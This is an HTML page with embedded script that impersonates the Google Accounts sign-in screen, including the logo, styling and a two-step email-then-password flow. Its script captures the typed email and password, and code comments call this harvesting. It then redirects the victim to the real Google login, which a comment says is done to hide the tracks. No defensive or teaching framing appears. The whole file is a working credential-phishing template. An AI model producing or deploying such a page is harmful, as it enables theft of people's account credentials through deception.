<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body, html {
            margin: 0; padding: 0; height: 100%; width: 100%;
            background-color: #f0f4f9;
            font-family: 'Roboto', arial, sans-serif;
            display: flex; align-items: center; justify-content: center;
            overflow: hidden;
        }

        .login-card {
            background: #ffffff;
            width: 740px;
            min-height: 440px;
            padding: 48px;
            border-radius: 28px;
            display: grid;
            grid-template-columns: 1fr 1fr;
            box-sizing: border-box;
            box-shadow: 0 1px 2px 0 rgba(60,64,67,.3), 0 1px 3px 1px rgba(60,64,67,.15);
        }

        .left-side { padding-right: 24px; }
        .logo { width: 48px; height: 48px; margin-bottom: 16px; }
        h1 { font-family: 'Google Sans', sans-serif; font-size: 36px; font-weight: 400; color: #1f1f1f; margin: 0; }
        .subtitle { font-size: 16px; color: #1f1f1f; margin-top: 12px; }

        .right-side { display: flex; flex-direction: column; padding-top: 48px; }
        .input-group { position: relative; margin-bottom: 8px; }
        
        input {
            width: 100%; padding: 13px 15px; border: 1px solid #747775;
            border-radius: 4px; font-size: 16px; box-sizing: border-box;
        }

        input:focus { outline: none; border: 2px solid #0b57d0; padding: 12px 14px; }

        .link-btn { background: none; border: none; color: #0b57d0; font-weight: 500; cursor: pointer; text-align: left; margin-bottom: 40px; font-family: 'Google Sans'; }
        .privacy-notice { font-size: 14px; color: #444746; margin-bottom: 40px; }
        .action-row { display: flex; justify-content: flex-end; gap: 24px; margin-top: auto; }

        .btn-next { background-color: #0b57d0; color: white; border: none; padding: 10px 24px; border-radius: 20px; font-weight: 500; cursor: pointer; }
        .btn-create { background: none; border: none; color: #0b57d0; font-weight: 500; cursor: pointer; }

        /* Hidden class for switching views */
        .hidden { display: none; }
    </style>
</head>
<body>

<div class="login-card">
    <div class="left-side">
        <svg class="logo" viewBox="0 0 24 24">
            <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
            <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
            <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05"/>
            <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
        </svg>
        <h1 id="main-heading">Sign in</h1>
        <div class="subtitle" id="sub-heading">Use your Google Account</div>
    </div>

    <!-- Email Step -->
    <div class="right-side" id="email-step">
        <div class="input-group">
            <input type="text" id="email-input" placeholder="Email or phone">
        </div>
        <button class="link-btn">Forgot email?</button>
        <div class="privacy-notice">Not your computer? Use Guest mode to sign in privately.</div>
        <div class="action-row">
            <button class="btn-create">Create account</button>
            <button class="btn-next" onclick="handleNext()">Next</button>
        </div>
    </div>

    <!-- Password Step (Initially Hidden) -->
    <div class="right-side hidden" id="password-step">
        <div class="subtitle" style="margin-bottom:20px;"><strong id="display-email"></strong></div>
        <div class="input-group">
            <input type="password" id="password-input" placeholder="Enter your password">
        </div>
        <button class="link-btn">Forgot password?</button>
        <div class="action-row">
            <button class="btn-next" onclick="finishCapture()">Next</button>
        </div>
    </div>
</div>

<script>
    function handleNext() {
        const email = document.getElementById('email-input').value;
        if (email) {
            console.log("Captured Email: " + email); // This is where the data is 'harvested'
            
            // Switch UI to Password
            document.getElementById('email-step').classList.add('hidden');
            document.getElementById('password-step').classList.remove('hidden');
            
            document.getElementById('main-heading').innerText = "Welcome";
            document.getElementById('sub-heading').innerText = "";
            document.getElementById('display-email').innerText = email;
        } else {
            alert("Enter an email");
        }
    }

    function finishCapture() {
        const pass = document.getElementById('password-input').value;
        const email = document.getElementById('display-email').innerText;
        if (pass) {
            console.log("Captured Password for " + email + ": " + pass);
            // Redirect to the ACTUAL Google to hide our tracks
            window.location.href = "https://accounts.google.com/ServiceLogin";
        }
    }
</script>

</body>
</html>
